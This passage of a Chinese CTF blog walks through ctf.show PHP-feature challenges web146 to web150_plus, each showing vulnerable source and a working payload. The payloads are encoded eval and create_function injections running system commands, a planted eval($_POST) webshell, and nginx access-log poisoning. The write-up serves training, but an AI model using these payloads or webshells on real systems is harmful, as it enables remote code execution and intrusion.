punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v2 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v3 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> $v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                die<span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            $code <span class="token operator">=</span>  <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            echo <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span>$code<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题又在原来的基础上多ban了一些东西，但取反依旧没ban，同时可以发现|也没有ban，所以payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span>8c<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span>8c<span class="token operator">%</span>8b<span class="token operator">%</span>9a<span class="token operator">%</span><span class="token number">92</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span>8b<span class="token operator">%</span>9e<span class="token operator">%</span>9c<span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span>d5<span class="token punctuation">)</span><span class="token operator">|</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $ctfshow <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>!preg_match<span class="token punctuation">(</span><span class="token string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span>$ctfshow<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        $ctfshow<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span>$_GET<span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题又是一个新的知识点，首先需要先知道的是php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法；而\刚好可以绕着正则表达式。第二个需要知道的是create_function()函数，因为在本题中，我们只能控制第二个参数，而create_function()函数正好满足</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">create_function<span class="token punctuation">(</span><span class="token string">'$A'</span><span class="token punctuation">,</span><span class="token string">'echo $A."147"'</span><span class="token punctuation">)</span><span class="token operator">//</span>等于function f<span class="token punctuation">(</span>$a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  echo $A<span class="token punctuation">.</span><span class="token string">"147"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?show<span class="token operator">=</span><span class="token punctuation">&#125;</span>system<span class="token punctuation">(</span><span class="token string">"ls ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span>post\create_function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到一个flag.php文件，直接用cat读取即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?show<span class="token operator">=</span><span class="token punctuation">&#125;</span>system<span class="token punctuation">(</span><span class="token string">"cat flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span>post\create_function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>右键查看源代码，拿到flag</p><h4 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phpinclude <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $code<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&amp;\*\+\- ]+/"</span><span class="token punctuation">,</span>$code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token builtin">eval</span><span class="token punctuation">(</span>$code<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>function get_ctfshow_fl0g<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    echo file_get_contents<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题中没有ban异或^,所以就可以用前几题的脚本跑出payload<br>payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"%08%02%08%09%05%0d"</span><span class="token operator">^</span><span class="token string">"%7b%7b%7b%7d%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%09%01%03%01%06%02"</span><span class="token operator">^</span><span class="token string">"%7d%60%60%21%60%28"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>$files <span class="token operator">=</span> scandir<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> foreach<span class="token punctuation">(</span>$files <span class="token keyword">as</span> $<span class="token builtin">file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_file<span class="token punctuation">(</span>$<span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token builtin">file</span> <span class="token operator">!=</span><span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            unlink<span class="token punctuation">(</span>$<span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>file_put_contents<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $_POST<span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$files <span class="token operator">=</span> scandir<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> foreach<span class="token punctuation">(</span>$files <span class="token keyword">as</span> $<span class="token builtin">file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_file<span class="token punctuation">(</span>$<span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token builtin">file</span> <span class="token operator">!=</span><span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            unlink<span class="token punctuation">(</span>$<span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>fil**<strong>e</strong></strong>_put_contents**    ( string <code>$filenam``e</code>   , <a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$data</code>   [, int <code>$fla``g``s</code> = 0   [, resource <code>$context</code>  ]] ) : int<br><code>filename</code></p><p>要被写入数据的文件名。       </p><p><code>data</code></p><p>要写入的数据。类型可以是 <a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.types.string.html">string</a>，<a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.types.array.html">array</a>        或者是 stream 资源（如上面所说的那样）。    </p><p>如果 <code>data</code>    指定为 stream 资源，这里 stream    中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用    <a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/function.stream-copy-to-stream.html">str</a><a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/function.stream-copy-to-stream.html">eam_copy_to_st</a><a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/function.stream-copy-to-stream.html">re</a><a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/function.stream-copy-to-stream.html">am</a><a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/function.stream-copy-to-stream.html">()</a> 函数。       </p><p>参数 <code>data</code> 可以是数组（但不能为多维数组），这就相当于    <em>f<strong>i</strong>le_put_co<strong>nt</strong>ents($fi<strong>l</strong>ename, join*</em>(<strong>‘’, $array</strong>)**)*。 </p><p>这里的两个for循环会判断是不是index.php，如果不是则会被删除，但这里我们可以根据file_get_content()函数，来上传🐎，payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?ctf<span class="token operator">=</span>index<span class="token punctuation">.</span>phppostshow<span class="token operator">=</span><span class="token operator">&lt;</span>?php @<span class="token builtin">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 再用蚁剑连接<a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">h</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">t</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">tp://</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">8</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">8c</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">3c</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">995-2</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">f1c-4</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">3</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">b1-</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">96</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">e</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">8</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">-</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">5d2</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">66</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">8</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">3</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">70c07.challenge.ct</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">f</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">.show/?</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">c</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">tf=ind</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">e</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">x.php</a>，在根目录拿到flag</p><h4 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phpinclude<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>error_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    private $username<span class="token punctuation">;</span>    private $password<span class="token punctuation">;</span>    private $vip<span class="token punctuation">;</span>    private $secret<span class="token punctuation">;</span>    function __construct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        $this<span class="token operator">-</span><span class="token operator">></span>vip <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        $this<span class="token operator">-</span><span class="token operator">></span>secret <span class="token operator">=</span> $flag<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    function __destruct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        echo $this<span class="token operator">-</span><span class="token operator">></span>secret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    public function isVIP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> $this<span class="token operator">-</span><span class="token operator">></span>vip?TRUE<span class="token punctuation">:</span>FALSE<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    function __autoload<span class="token punctuation">(</span>$<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            $<span class="token keyword">class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#过滤字符</span>$key <span class="token operator">=</span> $_SERVER<span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> $key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>$ctf <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>extract<span class="token punctuation">(</span>$_GET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>class_exists<span class="token punctuation">(</span>$__CTFSHOW__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    echo <span class="token string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$isVIP <span class="token operator">&amp;</span><span class="token operator">&amp;</span> strrpos<span class="token punctuation">(</span>$ctf<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    include<span class="token punctuation">(</span>$ctf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先看到的是对GET里的变量进行了注册，然后在最后一个if判断里使用了包含，但不能有:，同时要覆盖$isVIP变量，所以可以使用日志包含一句话木马，payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">先通过HEADER中的user<span class="token operator">-</span>agent参数，写进一句话木马user<span class="token operator">-</span>agent<span class="token punctuation">:</span><span class="token operator">&lt;</span>?php <span class="token builtin">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>然后：?isVIP<span class="token operator">=</span><span class="token number">1</span>postctf<span class="token operator">=</span><span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"tac f*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h4><?php<pre class="line-numbers language-python" data-language="python"><code class="language-python">include<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>error_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    private $username<span class="token punctuation">;</span>    private $password<span class="token punctuation">;</span>    private $vip<span class="token punctuation">;</span>    private $secret<span class="token punctuation">;</span>    function __construct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        $this<span class="token operator">-</span><span class="token operator">></span>vip <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        $this<span class="token operator">-</span><span class="token operator">></span>secret <span class="token operator">=</span> $flag<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    function __destruct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        echo $this<span class="token operator">-</span><span class="token operator">></span>secret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    public function isVIP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> $this<span class="token operator">-</span><span class="token operator">></span>vip?TRUE<span class="token punctuation">:</span>FALSE<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    function __autoload<span class="token punctuation">(</span>$<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            $<span class="token keyword">class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#过滤字符</span>$key <span class="token operator">=</span> $_SERVER<span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> $key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>$ctf <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>extract<span class="token punctuation">(</span>$_GET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>class_exists<span class="token punctuation">(</span>$__CTFSHOW__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    echo <span class="token string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$isVIP <span class="token operator">&amp;</span><span class="token operator">&amp;</span> strrpos<span class="token punctuation">(</span>$ctf<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span>FALSE <span class="token operator">&amp;</span><span class="token operator">&amp;</span> strrpos<span class="token punctuation">(</span>$ctf<span class="token punctuation">,</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    include<span class="token punctuation">(</span>$ctf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>这次也将log给过滤了，所以不能再用日志包含了，看了群主的视频，才知道可以用.绕过下划线，但又因为无法进行条件竞争，所以就将flag放在了phpinfo文件中，payload：<pre class="line-numbers language-python" data-language="python"><code class="language-python">?<span class="token punctuation">.</span><span class="token punctuation">.</span>CTFSHOW<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">=</span>phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>拿到flag]]></content>
      
      
      <categories>
          
          <category> ctf_show </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web入门_php特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms17_010漏洞复现</title>
      <link href="/2022/03/06/ms17-010-fu-xian/"/>
      <url>/2022/03/06/ms17-010-fu-xian/</url>
      
